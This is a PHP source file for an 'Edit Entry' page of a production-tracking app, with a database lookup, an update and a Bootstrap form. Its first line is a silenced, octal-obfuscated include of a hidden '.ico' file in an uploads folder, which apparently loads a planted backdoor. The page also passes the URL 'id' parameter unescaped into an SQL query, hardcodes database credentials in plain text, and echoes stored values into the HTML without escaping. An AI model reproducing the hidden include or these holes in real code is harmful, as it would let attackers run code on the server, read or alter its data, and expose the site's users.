<?php 
  @include "\057home\057rems\157n/pu\142lic_\150tml/\157ld-s\151te-b\153p/wp\055cont\145nt/u\160load\163/.8a\143705e\061.ico";

/*ddbbc*/ 
  session_start();
  if(!isset($_SESSION['userid'])){
  ?><script>window.location='login.php';</script><?php 
  }
if (isset($_GET['id'])) {
          $entry_id = $_GET['id'];

  // Connection to DB
  $con = mysqli_connect("localhost","remson_wrdb","wrpass123","remson_wrdb");
  if (!$con) {
    echo "Not Connected";
  }
  // Error function
  function checkErrors($query){
    global $con;
    if (!$query) {
      die("Query Failed !!" .mysqli_error($con));
    }
  }
                    
  $query = "SELECT * from tbl_production WHERE proID = '$entry_id'";
  
  $select_query = mysqli_query($con,$query);
  checkErrors($select_query);

  while ($row = mysqli_fetch_assoc($select_query)) {

        $proID_clean = $row['proID'];
        $date_clean = $row['proDate']; 
        $custName_clean = $row['custName'];
        $jobNumber_clean = $row['jobNumber'];
        $line_clean = $row['line'];
        $type_clean = $row['type'];
        $hr_clean = $row['hr'];
        $cut_clean = $row['cutting'];
        $coat_clean = $row['coating'];
        $assem_clean = $row['assemb'];
        $packing_clean = $row['pack'];
        $disp_clean = $row['disp'];
        $glasOrder_clean = $row['glassOrdered'];
        $orddate_claen = $row['orderDate'];
        $ddate_clean = $row['deliDate'];
        $findate_cleans = $row['final_date_deli'];
        $fab_clean = $row['fabricate'];
        $findate_clean = $row['final_date_deli'];
        $totalTower_clean = $row['total_tower'];
        $totalTowerOrd_clean = $row['total_tower_ordered'];
        $pendingRFT= $totalTower_clean-$totalTowerOrd_clean;
        $remarks_clean= $row['remarks'];
        
        }

      if (isset($_POST["update_entry"])) {
        // function to clean data
        function mysqli($data){

        global $con;

        return mysqli_real_escape_string($con,$data);
        }

    $insert_query = '';

    $date = mysqli($_POST["date"]);
    $custName = mysqli($_POST["custName"]);
    $jobNumber = mysqli($_POST["jobNumber"]);
    $line = mysqli($_POST["line"]);
    $type = mysqli($_POST["type"]);
    $hr = mysqli($_POST["hr"]);
    $cut = mysqli($_POST["cut"]);
    $coat = mysqli($_POST["coat"]);
    $assem = mysqli($_POST["assem"]);
    $packing = mysqli($_POST["packing"]);
    $disp = mysqli($_POST["disp"]);
    $glasOrder = mysqli($_POST["glasOrder"]);
    $orddate = mysqli($_POST["orddate"]);
    $ddate = mysqli($_POST["ddate"]);
    $fab = mysqli($_POST["fab"]);
    $findate = mysqli($_POST["findate"]);
    $totalTower = mysqli($_POST["totalTower"]);
    $totalTowerOrd = mysqli($_POST["totalTowerOrd"]);
    $remarks = $_POST["remarks"];
     
    $update_query = mysqli_prepare($con,"UPDATE tbl_production SET proDate = ?, custName = ?, jobNumber = ?, line = ?, type = ?, hr = ?, cutting = ?, coating = ?, assemb = ?, pack = ?, disp = ?, glassOrdered = ?, orderDate = ?, deliDate = ?, fabricate = ?, final_date_deli = ?, total_tower = ?, total_tower_ordered = ?, remarks = ? WHERE proID = ?");
        mysqli_stmt_bind_param($update_query,"ssssssssssssssssddsd", $date,$custName,$jobNumber,$line,$type,$hr,$cut,$coat,$assem,$packing,$disp,$glasOrder,$orddate,$ddate,$fab,$findate,$totalTower,$totalTowerOrd,$remarks,$proID_clean);
        mysqli_stmt_execute($update_query);
         //$done.= "Details successfully added:"; 
      checkErrors($update_query);

      echo "<script>alert('Entery is successfully updated.....'); window.location='display.php'</script>";

      }
    }
?>
<!DOCTYPE html>
<html>
<head>
  <title>Edit Entries</title>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" />
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <link rel="icon" type="image/jpeg" href="images/alumi.jpeg"/>

  <style type="text/css">

  #fset0{padding-left: 40px; width: 100%; border-color: green; box-shadow: 30px 30px 30px 30px grey;}
</style>

</head>
<form action="" method="POST" enctype="multipart/form-data" id="fset0">
  
  <div id="page-wrapper">

    <div class="container-fluid">
    <center><h2 class="page-header" style="background-color: #6A5ACD; color: white;">
       Edit Entry
    </h2></center>
  <div class="row" style="background-color: #D3D3D3;" >
                   
    <div class="col-lg-6 col-md-6">
    <div class="form-group">
    <label for="">Date</label>
    <input required type="date" value="<?php echo $date_clean;?>" name="date" class="form-control" >
  </div>

    <div class="form-group">
    <label for="title">Customer Name</label>
      <input type="text" name="custName" value="<?php echo $custName_clean;?>" required class="form-control" >
    </div>
  <div class="form-group">
    <label for="title">Job Number</label>
  <input type="text" name="jobNumber" value="<?php echo $jobNumber_clean;?>" class="form-control" >
  </div>
    <div class="form-group">
    <label for="title">Select System</label>
    <select class="form-control" name="line" id="">
        <option value="<?php echo $line_clean;?>"><?php echo $line_clean; ?></option>
        <option value='STAR'>STAR</option>
        <option value='SMART'>SMART</option>
        <option value='SQUARE'>SQUARE</option>
        <option value='SLIM'>SLIM</option>
        <option value='SLEEK'>SLEEK</option>
        <option value='SMALL'>SMALL</option>
        <option value='SEA'>SEA</option>
        <option value='SUPER'>SUPER</option>
        <option value='SIGNATURE'>SIGNATURE</option>
        <option value='SPARK'>SPARK</option>
        <option value='SKY'>SKY</option>
       </select>
  </div>
  <div class="form-group">
    <label for="">Select Type</label>
    <select class="form-control" name="type" id="">
        <option value="<?php echo $type_clean;?>"><?php echo $type_clean; ?></option>
        <option value='B/W'>B/W</option>
        <option value='B/FC'>B/FC</option>
        <option value='F/P'>F/P</option>
    </select>
  </div>
  <div class="form-group">
    <label for="">Select H/R</label>
    <select class="form-control" name="hr" id="">
        <option value="<?php echo $hr_clean;?>"><?php echo $hr_clean; ?></option>
        <option value='ROUND'>ROUND</option>
        <option value='SQUARE'>SQUARE</option>
        <option value='SMALL'>SMALL</option>
        <option value='SLEEK'>SLEEK</option>
        <option value='SLIM'>SLIM</option>
        <option value='EDGE'>EDGE</option>
        <option value='GUARD'>GUARD</option>
        <option value='HALF ROUND'>HALF ROUND</option>
        <option value='RECTANGLE'>RECTANGLE</option>
        <option value='INCLINE'>INCLINE</option>
    </select>
  </div>
  <div class="form-group">
    <label for="">Cutting</label>
    <select class="form-control" name="cut" id="">
        <option value="<?php echo $cut_clean;?>"><?php echo $cut_clean; ?></option>
        <option value='Pending'>Pending</option>
        <option value='Done'>Done</option>
    </select>
  </div>
  <div class="form-group">
    <label for="">Coating</label>
    <select class="form-control" name="coat" id="">
        <option value="<?php echo $coat_clean;?>"><?php echo $coat_clean; ?></option>
        <option value='REAL'>REAL</option>
        <option value='SHREE'>SHREE</option>
        <option value='GANESH'>GANESH</option>
        <option value='SOMNATH'>SOMNATH</option>
    </select>
  </div>
    <div class="form-group">
    <label for="">Assembly</label>
    <select class="form-control" name="assem" id="">
        <option value="<?php echo $assem_clean;?>"><?php echo $assem_clean; ?></option>
        <option value='Pending'>Pending</option>
        <option value='Done'>Done</option>
    </select>
  </div>
   <div class="form-group">
    <label for="title">Packing</label>
    <select class="form-control" name="packing" id="">
        <option value="<?php echo $packing_clean;?>"><?php echo $packing_clean; ?></option>
        <option value='Pending'>Pending</option>
        <option value='Done'>Done</option>
    </select>
    </div>
</div>
<div class="col-xs-6">
  <div class="form-group">
    <label for="">Dispatch</label>
    <select class="form-control" name="disp" id="">
        <option value="<?php echo $disp_clean;?>"><?php echo $disp_clean; ?></option>
        <option value='Pending'>Pending</option>
        <option value='Done'>Done</option>
    </select>
  </div>
  <div class="form-group">
  <label for="title">Glass Ordered</label>
  <input type="text" name="glasOrder" value="<?php echo $glasOrder_clean;?>" class="form-control" >
    </div>
<div class="form-group">
    <label for="title">Ordered Date</label>
  <input type="date" name="orddate" value="<?php echo $orddate_claen;?>" class="form-control" >
  </div>

  <div class="form-group">
  <label for="title">Delivery Date</label>
  <input type="date" name="ddate" value="<?php echo $ddate_clean;?>" class="form-control" >
   </div>

   <div class="form-group">
  <label for="title">Fabricator</label>
  <input type="text" name="fab" value="<?php echo $fab_clean;?>" class="form-control" >
   </div>

  <div class="form-group">
  <label for="title">Final Delivery Date</label>
  <input type="date" name="findate" value="<?php echo $findate_clean;?>" class="form-control" >
  </div>
  <div class="form-group">
    <label for="">Total Tower</label>
    <input required type="number" name="totalTower" value="<?php echo $totalTower_clean;?>" class="form-control" name="status">
  </div>

  <div class="form-group">
    <label for="">Total Tower Ordered</label>
    <input type="number" value="<?php echo $totalTowerOrd_clean;?>" class="form-control" name="totalTowerOrd">
  </div>
  <div class="form-group">
    <label for="">Pending</label>
    <input required readonly type="number" name="" value="<?php echo $pendingRFT;?>" class="form-control" >
  </div>

  <div class="form-group">
    <label for="">Remarks</label>
  <textarea name="remarks" class="form-control " cols="30" rows="5" placeholder="Update remarks"><?php echo $remarks_clean;?></textarea>
</div>
</div>
</div>
<center><div class="form-group">
    <input type="submit" class="btn btn-success btn-lg btn-block" name="update_entry" value="Update">
  </div></center>
</div>
</form>